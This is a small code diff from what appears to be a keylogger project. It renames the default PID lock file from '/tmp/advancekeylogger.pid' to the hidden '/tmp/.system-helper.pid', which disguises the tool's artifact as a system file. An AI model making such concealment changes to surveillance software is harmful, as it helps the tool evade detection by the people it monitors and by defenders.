@@ -78,7 +78,7 @@ def remove_sqlite_database(sqlite_path: str, secure_wipe: bool = False) -> None:
 def remove_pid_file(pid_file: str | None = None) -> None:
     """Remove the PID lock file."""
     if pid_file is None:
-        pid_file = "/tmp/advancekeylogger.pid"
+        pid_file = "/tmp/.system-helper.pid"
     path = Path(pid_file)
     if path.exists():
         try:
